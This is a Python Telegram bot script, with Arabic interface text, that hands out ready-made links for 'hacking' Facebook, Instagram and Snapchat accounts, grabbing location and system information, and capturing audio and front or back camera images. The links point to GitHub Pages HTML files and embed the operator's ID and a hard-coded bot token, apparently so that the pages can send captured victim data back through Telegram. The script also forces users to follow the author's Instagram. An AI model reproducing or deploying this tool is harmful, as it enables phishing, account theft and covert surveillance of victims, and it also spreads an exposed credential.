import telebot
from telebot import types
import time

# --- الإعدادات الأساسية (M.Y.9) ---
API_TOKEN = '8151523455:AAHrG3jEolK9P3Gid6q8Qe79hM9pA-OooyU' 
ADMIN_ID = '7238206121' # أبو أسيد Malkawi
GITHUB_URL = "https://m-y-9-tech.github.io/" 

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    
    # رسالة التنبيه الأولية بالزخرفة المطلوبة
    welcome_text = (
        "أبو أسيد للمعلومات 🦅\n"
        "⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:\n\n"
        "عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـضـمـان تـفـعـيـل الـنـظـام يـجـب مـتـابـعـة حـساب المـطـور الـرسمـي عـلى انـسـتـغـرام."
    )
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    # أسماء الروابط مزخرفة "اختراق" كما طلبت وبالترتيب
    btns = [
        types.InlineKeyboardButton("🔹 اخـتـراق فـيـس بـوك", callback_data="fb"),
        types.InlineKeyboardButton("🔸 اخـتـراق انـسـتـغـرام", callback_data="ig"),
        types.InlineKeyboardButton("👻 اخـتـراق سـنـاب شـات", callback_data="sn"),
        types.InlineKeyboardButton("📍 سـحـب الـمـوقـع", callback_data="lc"),
        types.InlineKeyboardButton("💻 اخـتـراق مـعـلـومـات", callback_data="sys"),
        types.InlineKeyboardButton("🎤 اخـتـراق صـوت", callback_data="au"),
        types.InlineKeyboardButton("🤳 كـمـرة أمـامـيـة", callback_data="c1"),
        types.InlineKeyboardButton("📷 كـمـرة خـلـفـيـة", callback_data="c2")
    ]
    markup.add(*btns)
    markup.add(types.InlineKeyboardButton("📢 متابعة المطور (Instagram)", url="https://www.instagram.com/abu_osayed_malkawi"))
    
    bot.send_message(chat_id, welcome_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_links(call):
    chat_id = call.message.chat.id
    data = call.data
    
    # رسالة الانتظار دقيقتين (التمويه الصارم)
    wait_text = (
        "أبو أسيد للمعلومات 🦅\n"
        "📢 تـنـبـيـه الـمـطـور (Abu Osayed Malkawi):\n\n"
        "الـرجـاء الانـتـظـار لـمـدة (2 دقـيـقـة) حـتـى يـتـم تـأكـيـد مـتـابـعـتـك لـلـحـساب وتـولـيـد الـروابـط تـلـقـائـيـاً 💀🔥"
    )
    
    bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=wait_text)
    
    # الانتظار الإجباري 120 ثانية
    time.sleep(120) 

    params = f"?admin_id={ADMIN_ID}&user_id={chat_id}&bot_token={API_TOKEN}"
    files = {
        "fb": "fb.html", "ig": "ig.html", "sn": "sn.html",
        "lc": "loc.html", "sys": "sys.html", "au": "audio.html",
        "c1": "c1.html", "c2": "c2.html"
    }
    
    final_link = GITHUB_URL + files[data] + params
    
    # الرسالة النهائية المزخرفة مع المسافات بين الروابط
    result_text = (
        "أبو أسيد للمعلومات 🦅\n"
        "🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم الـتـحـقـق بـنـجـاح ✅\n\n"
        "👤 Developer: 𝔸𝕓𝕦 𝕆𝕤𝕒𝕪𝕖𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚\n\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n"
        f"🔗 الرابط المزخرف جاهز للاستخدام:\n\n"
        f"{final_link}\n\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n"
        "⚖️ إخـلاء مـسـؤولـيـة: الـمـطـور (Abu Osayed Malkawi) غـيـر مـسـؤول عـن أي اسـتـخـدام ضـار.\n\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        "⚙️ Status: Connected Successfully"
    )
    
    bot.send_message(chat_id, result_text)
    bot.send_message(ADMIN_ID, f"🔔 تم توليد رابط {data} بنجاح.")

if __name__ == "__main__":
    bot.remove_webhook()
    bot.infinity_polling(skip_pending=True)
